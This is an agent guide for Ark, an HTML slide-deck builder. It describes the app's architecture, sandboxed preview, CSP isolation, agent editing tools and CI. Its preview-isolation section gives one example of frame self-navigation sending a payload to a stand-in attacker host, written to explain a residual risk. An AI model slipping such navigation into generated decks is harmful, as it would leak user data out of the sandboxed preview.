# Ark — Agent Guide

Ark is a presentation builder: a PowerPoint-like app where each presentation is a **single-page HTML file** (HTML + CSS, optionally libraries like reveal.js). Users provide data in a side chat; an AI agent generates and edits slides in real time.

## Product model

- **Shell app** (`apps/web/`): React + TypeScript + Vite. Hosts the editor UI, slide preview, and agent chat panel.
- **API server** (`apps/api/`): Express. Persists decks and chat, runs the generation agent loop, and serves approved runtime assets.
- **Sandbox host** (`apps/sandbox/`): Separate-origin preview renderer with strict CSP isolation.
- **Workspace packages** (`packages/`): `@ark/contracts` (HTTP API Zod schemas), `@ark/deck-core` (deck helpers and bridge protocols), `@ark/runtime-registry` (approved runtime manifest and validation).
- **Decks**: Self-contained single-page HTML documents (HTML + CSS, optionally approved runtimes like reveal.js). Decks are **persisted server-side** — JSON files under `data/decks/` by default, or Postgres when `DATABASE_URL` is set — and edited through the API/agent tools, not as files in the repo. (The `presentations/` directory exists for ad-hoc local fixtures but is not part of the persistence path.)
- **Agent chat**: Side panel beside the slide preview. User supplies content (notes, data, bullet points); the agent writes or updates the active deck HTML via tools.

## Tech stack

| Layer           | Choice                                           |
| --------------- | ------------------------------------------------ |
| Package manager | **pnpm** (never npm/yarn)                        |
| Framework       | React 19 + TypeScript                            |
| Build           | Vite                                             |
| Presentations   | Plain HTML/CSS; reveal.js or similar when needed |
| Lint            | ESLint                                           |

## Commands

```bash
pnpm install    # install dependencies
pnpm dev        # start dev server
pnpm build      # typecheck + production build
pnpm lint       # run ESLint
pnpm test       # Vitest: packages in parallel, apps serial
pnpm preview    # preview production build
```

## Project layout

```
ark/
├── apps/
│   ├── web/                # React/Vite shell (`@ark/web`)
│   ├── api/                # Express API (`@ark/api`)
│   └── sandbox/            # Sandbox preview host (`@ark/sandbox`)
├── packages/
│   ├── contracts/          # HTTP API contracts (`@ark/contracts`)
│   ├── deck-core/          # Shared deck logic (`@ark/deck-core`)
│   └── runtime-registry/   # Runtime manifest + validation (`@ark/runtime-registry`)
├── test/                   # cross-layer HTML fixtures (`test/fixtures/`) for tests and smoke scripts
├── runtimes/               # vendored approved runtime assets (e.g. reveal.js) + manifest
├── agent-guides/           # always-on markdown appended to the deck agent system prompt
├── docs/                   # runtime/preview/bridge + backend architecture notes
├── scripts/                # runtime sync + smoke tests
├── data/                   # local dev persistence (gitignored): decks, chat
└── AGENTS.md               # this file
```

## Import boundaries

`apps/web`, `apps/api`, `apps/sandbox`, and `packages/*` have enforced dependency directions (issues #131, #136):

- `apps/web` may import from `@ark/contracts`, `@ark/deck-core`, and `@ark/runtime-registry` only — never from `apps/api`.
- `apps/api` may import from workspace packages only — never from `apps/web`.
- `apps/sandbox` may import from `@ark/api/preview-sessions` (shared in-memory store), workspace packages, and its own files — never from `apps/web`.
- `packages/*` must not import from `apps/`. `@ark/contracts` may depend on `@ark/deck-core` and `@ark/runtime-registry`; `@ark/deck-core` depends on `@ark/runtime-registry` only (no cycle back to contracts).
- Cross-layer HTML fixtures live in `test/fixtures/` (Vitest alias `@fixtures/...`).
- HTTP API contracts live in `packages/contracts/` — import from `@ark/contracts` in application code. See [packages/contracts/README.md](packages/contracts/README.md).

`pnpm lint` fails on forbidden imports. See [docs/architecture-boundaries.md](docs/architecture-boundaries.md).

## React app conventions

- Functional components and hooks only.
- Colocate component styles (CSS modules or co-located `.css` files) — match existing patterns in the file you edit.
- Keep the shell thin: presentation rendering lives in HTML files, not in React components.
- Prefer extracting reusable logic into hooks under `src/hooks/`.
- Run `pnpm lint` after substantive changes.
- Always run `pnpm format` before committing; CI enforces `pnpm format:check`.
- CI runs `quality` (lockfile/lint/format/audit/openapi), `build`, `test`, and `smoke` on every push to `main` and on pull requests (`.github/workflows/ci.yml`, Linux runner).

## Presentation HTML conventions

When creating or editing deck HTML (through the agent tools or upload):

1. **Self-contained**: One `.html` file per deck. Inline `<style>` CSS; no external http(s) URLs for scripts, stylesheets, fonts, or images.
2. **Modern and polished**: Clean typography, consistent spacing, intentional color palette. Avoid generic “AI slop” aesthetics.
3. **Agent-friendly structure**: Use clear section/slide boundaries (e.g. `<section class="slide">` for plain decks, or `.reveal > .slides > section` for reveal.js — see [docs/reveal-runtime.md](docs/reveal-runtime.md)).
4. **Safe preview**: Prefer `addEventListener` over inline handlers; use inline CSS, data URIs, and SVG — no external http(s) resource URLs.
5. **Incremental edits**: Prefer patching specific slides over rewriting the entire file when the user asks for small changes.
6. **Approved runtimes**: Use pinned `/api/runtimes/...` assets from the registry — never CDNs. See [docs/runtimes.md](docs/runtimes.md), [docs/reveal-runtime.md](docs/reveal-runtime.md), and [docs/chart-runtime.md](docs/chart-runtime.md).

### Preview network isolation

Deck preview blocks external **fetches and resource loads** from generated or uploaded HTML (scripts, stylesheets, fonts, images, XHR/fetch). Frame **self-navigation** is a residual platform risk in full-JS mode (see below).

- **Sandbox host** — Main preview and Present mode load decks from a separate origin (default `http://localhost:5174`) using short-lived render tokens from `POST /api/preview-sessions`. The sandbox host applies strict CSP/COOP/CORP response headers and does not share app cookies or storage.
- **CSP** — Ark injects `Content-Security-Policy` with `connect-src 'none'` and `default-src 'none'` into preview documents (HTTP headers on the sandbox host; meta tags in thumbnail `srcDoc` fallbacks). Inline styles/scripts are allowed; external scripts, stylesheets, fonts, and images are blocked at runtime.
- **Validation** — `external_url` is a blocking error on upload, save, and generation. The preview chrome shows a clear banner when a loaded deck still contains external URLs.
- **Asset proxy** — `GET /api/deck-assets?url=...` can fetch allowlisted remote assets server-side when `ARK_DECK_ASSET_ALLOWLIST` is set. With no allowlist (default), all proxied requests return 403.
- **Frame self-navigation (full-JS residual risk)** — A sandboxed iframe may always navigate **itself** (e.g. `location.href = 'https://evil.example/?' + payload`). CSP cannot block navigations (`navigate-to` never shipped). The shell uses a ref-gated bridge session plus a head-first `ark:deck-handshake` (generation correlation, not a secret): ordinary parent→frame bridge/editor traffic is blocked until the session is armed, and an unexpected load flips a synchronous send gate, tears down the preview, and reports via `POST /api/runtime-errors`. The **initial** outbound navigation request cannot be prevented by the platform; containment of subsequent Ark traffic is the mitigation — not complete isolation of untrusted deck JavaScript.

### Preview JavaScript

The shell uses preview modes based on runtime detection (see `detectPreviewMode` in `src/lib/deck-preview.ts`). The parent ↔ iframe contract is defined in `packages/deck-core/deck-bridge.ts` and documented in [docs/deck-bridge.md](docs/deck-bridge.md). Manual editing uses a separate editor bridge (`packages/deck-core/deck-editor-bridge.ts`) documented in [docs/deck-editor-bridge.md](docs/deck-editor-bridge.md).

- **CSS-only** — deck scripts are stripped; Ark injects a navigation shim. Default for plain decks and reveal decks without approved runtime assets.
- **Full-JS (custom)** — deck scripts run when `data-ark-deck="nav"` or `data-ark-preview="full-js"` is set. Ark injects a bridge (`postMessage` ↔ DOM `CustomEvent`); the deck owns navigation.
- **Full-JS (reveal adapter)** — reveal decks with approved registry markers and `/api/runtimes/reveal.js/5.1.0/reveal.js` get Ark's reveal navigation adapter automatically. No deck-authored bridge script. See [docs/reveal-runtime.md](docs/reveal-runtime.md).

Thumbnails prefer sandbox-rendered PNGs from the API Chromium pipeline; the strip falls back to script-stripped `srcDoc` iframes (`sandbox=""`) when the renderer is disabled, pending, or failed. Main preview uses `sandbox="allow-scripts"` without `allow-same-origin`, loaded from the sandbox host URL by default (`VITE_ARK_PREVIEW_SRCDOC=true` restores legacy `srcDoc`). Approved runtime asset URLs are absolutized to the app origin in preview. Parent ↔ deck `postMessage` is scoped to the configured app/sandbox origins. Ark injects a strict CSP so deck scripts cannot make network requests; the UI shows a "Scripts running" indicator in full-JS mode.

Custom scripted decks with navigation must use `data-ark-deck="nav"` and the Ark bridge protocol (`ark:deck-goto`, `ark:deck-slide-change`, `ark:deck-ready`, etc.).

Example skeleton (plain HTML):

```html
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Deck Title</title>
    <style>
      /* deck styles */
    </style>
  </head>
  <body>
    <!-- slide: Title -->
    <section class="slide">...</section>
    <!-- slide: Agenda -->
    <section class="slide">...</section>
  </body>
</html>
```

## Agent chat behavior

When acting as the presentation agent (side chat):

- **Input**: User provides raw content — notes, CSV snippets, bullet lists, images URLs, tone/style preferences.
- **Output**: Updated HTML for the active deck (persisted server-side), or a new deck.
- **Workflow**: Confirm scope briefly, generate slides, then offer targeted follow-ups (e.g. “Want a dark theme?”).
- **Preview**: Assume the React shell loads the active `.html` in an iframe; broken markup breaks the preview — validate structure.
- **Scope**: Do not refactor the React shell unless the user asks; focus on presentation HTML and chat-related UI.

### Conversation context (issue #17)

Ark replays the **full visible chat history** on every generation job request (pi-style), including prior user turns, assistant text, tool calls, and paired tool results. Vercel AI SDK owns tool-result continuation within a single job.

- **Persisted with the deck**: Deck HTML is saved server-side (#10). Chat messages are also persisted server-side per deck (`GET/POST/DELETE /api/decks/:id/chat`, JSON files under `data/chat/` or Postgres); `localStorage` (`ark:chat-session:{deckId|new}`) acts as a client-side cache/fallback so refresh restores the conversation even when the API is briefly unavailable. Chat for a not-yet-saved deck lives only in `localStorage` until the deck is created.
- **Assistant messages**: Durable chat keeps every logical step using recoverable, tool-specific projections, never repeated full deck HTML. Model-only context projection may summarize older steps and tells the model to re-read authoritative deck state.
- **Token/cost**: Follow-up edits use patches instead of re-emitting the document. Context assembly is separate from append-only persistence; future compaction is documented in `docs/agent-context.md` but is not implemented.

### Deck parser (issue #37)

Server-side structured parsing lives in `server/deck-parser.ts`. `parseDeckHtml` extracts title, runtime markers, slide structure (plain vs reveal), per-slide notes, style blocks, scripts, and asset references. Generation/editing services consume it via `server/deck-html.ts` and the `parse_deck` agent tool.

### Always-on agent guides

Markdown files under `agent-guides/` are automatically loaded and appended to the deck agent system prompt on every generation job (alongside tool definitions and chat history). Use numeric prefixes for ordering (`10-reveal-js.md`, `20-chart-js.md`); `README.md` and `_*.md` are excluded. Hard validation rules stay in the core prompt; guides hold longer authoring patterns. Override the directory with `ARK_AGENT_GUIDES_DIR` and cap size with `ARK_AGENT_GUIDES_MAX_BYTES` (see `.env.example`).

### Agent tool loop (issue #58)

Deck generation uses a **multi-step agent loop** (Vercel AI SDK `streamText` + `tools`; stops naturally or when the user aborts), similar to [pi's coding-agent](https://github.com/earendil-works/pi/tree/main/packages/coding-agent).

| Tool          | Purpose                                                                                                           |
| ------------- | ----------------------------------------------------------------------------------------------------------------- |
| `parse_deck`  | Structured deck metadata (title, runtime, slides, notes, styles, scripts, assets)                                 |
| `list_slides` | Enumerate slide boundaries and titles                                                                             |
| `read_deck`   | Read full HTML by line offset/limit or a single slide by index                                                    |
| `patch_deck`  | Structured slide-level operations (add, delete, replace, reorder, title, notes) — **preferred** for slide changes |
| `edit_deck`   | Apply exact `oldText` → `newText` patches (pi-style; each match must be unique)                                   |
| `write_deck`  | Replace the entire deck (new decks or explicit full rewrites)                                                     |

Server implementation: `server/deck-parser.ts`, `server/deck-tools.ts`, `server/deck-agent.ts`. The client shows tool calls/results in chat and applies deck updates from tool results (final HTML returned in the API response).

One user message → one agent run → as many tool/model steps as needed → deck update + assistant summary.

## Licensing

- Check licenses before adding or upgrading dependencies (direct or notable transitive) and before vendoring assets such as fonts, runtimes, or scripts.
- Prefer permissive, commercial SaaS-friendly licenses: MIT, Apache-2.0, BSD, ISC, 0BSD, BlueOak, and OFL for fonts. For dual-licensed packages, choose the permissive option (e.g. Apache-2.0 over MPL).
- Avoid or escalate copyleft/restrictive terms that can conflict with closed-source SaaS use: GPL, AGPL, SSPL, BUSL, Commons Clause, or proprietary licenses without a commercial grant.
- When redistributing fonts/assets, keep their LICENSE/NOTICE files with the redistributed files and update the root `NOTICE` when present.

## What to avoid

- Do not use npm or yarn — always pnpm.
- Do not embed presentation content in React JSX long-term; keep decks as self-contained HTML documents.
- Do not add heavy dependencies to the shell without clear need.
- Do not rewrite entire presentations for minor edits.
- Do not commit secrets or API keys.

## Current state

Fully working editor, not a scaffold. Implemented today:

- **Multi-deck persistence** with immutable versions and rollback (JSON files under `data/` by default; Postgres repositories + migrations under `apps/api/db/` when `DATABASE_URL` is set).
- **Server-persisted chat** per deck with `localStorage` caching.
- **Tool-based agent generation** via async generation jobs (create/status/cancel/retry) with observability.
- **Sandboxed preview** on a separate origin with CSP isolation, CSS-only and full-JS modes, sandbox-backed PNG thumbnails with `srcDoc` fallback, and Present mode.
- **Approved runtime registry** with vendored reveal.js 5.1.0 and chart.js 4.5.1 served from `/api/runtimes/...`.
- **Manual editing**: CSS-only and approved Reveal decks support PowerPoint-style selection and movement through the sandbox-safe editor bridge ([docs/deck-editor-bridge.md](docs/deck-editor-bridge.md), `packages/deck-core/deck-editor-bridge.ts`) and structured element patch API (`POST /api/decks/:id/patch`). Users can select deck-authored text, images, SVG, and containers; move or resize unlocked elements with snapping and keyboard nudge; insert text boxes/images; edit text and properties; duplicate, delete, reorder; and undo/redo. Moving unmanaged content adopts it into Ark's absolute layout while preserving its containing block and measured width. Selection chrome adapts to light/dark surfaces and preview scale. Custom-JS decks intentionally disable persistent manual editing because deck scripts share the iframe execution realm.

Typed API contracts shared by client and server live in `packages/contracts/` (`@ark/contracts`).

## Cursor Cloud specific instructions

Standard commands live in the `## Commands` section above and in `README.md`. Notes specific to this environment:

- **Dev server runs three processes.** `pnpm dev` uses `concurrently` to start the Express API (`apps/api`), the sandbox preview host (`apps/sandbox`, default `http://localhost:5174`), and the Vite client (`apps/web`, `http://localhost:5173`). The API reads `PORT` from `.env` or the environment (default `8787`); Vite proxies `/api` to that same port (see `apps/web/vite.config.ts`). Always open the app on `5173`, not the API or sandbox ports directly. Run it in a background/tmux session since it stays attached.
- **API server endpoints:** `GET /api/health`, `GET /api/models`, deck CRUD (`GET/POST /api/decks`, `GET/PUT/PATCH/DELETE /api/decks/:id`), element patches (`POST /api/decks/:id/patch`), versions (`GET /api/decks/:id/versions`, `GET /api/decks/:id/versions/:versionId`, `POST /api/decks/:id/rollback`), chat (`GET /api/decks/:id/chat`, `POST /api/decks/:id/chat/messages`, `DELETE /api/decks/:id/chat`), generation jobs (`POST /api/generation-jobs`, `GET /api/generation-jobs/:id`, `POST .../cancel`, `POST .../retry`), preview sessions (`POST /api/preview-sessions`, `GET /api/preview-sessions/:token`), thumbnails (`GET /api/decks/:id/thumbnails`, `GET /api/decks/:id/thumbnails/:versionId/:slideIndex.png?hash=…`), `POST /api/runtime-errors`, and `GET /api/deck-assets`. Health check is a quick liveness probe: `curl -s localhost:${PORT:-8787}/api/health`.
- **AI deck generation needs a provider key.** Add at least one of `OPENAI_API_KEY`, `ANTHROPIC_API_KEY`, or `GOOGLE_GENERATIVE_AI_API_KEY` (in `.env` or the environment). Without a key, the chat shows an "API key required" alert and generation is disabled — but the rest of the app (uploading an `.html` deck, preview, slide navigation, thumbnails, Present mode) works fully. Restart `pnpm dev` after changing keys.
- **`.env` is gitignored and optional.** Copy it from `.env.example` if you want to set keys there; the app still boots without it (generation just stays disabled). Provider keys are read from `process.env`, so secrets injected into the environment work too.
- **No API keys required for CI.** PR-blocking gates: `quality` (lockfile + lint + format + audit + openapi), `build`, `test`, and `smoke:plain-css`. `test:live-chromium` and extended browser smokes (Reveal / full-JS / manual-edit / thumbnails) run on `main` pushes only. CI pins `ARK_CHROMIUM_PATH=/usr/bin/google-chrome` so headless browser tests use the preinstalled Chrome on `ubuntu-latest`. Always run `pnpm format` before committing. The fastest no-key smoke test of core functionality is the toolbar "Upload HTML" button to load a self-contained deck, then navigate slides and use Present mode.
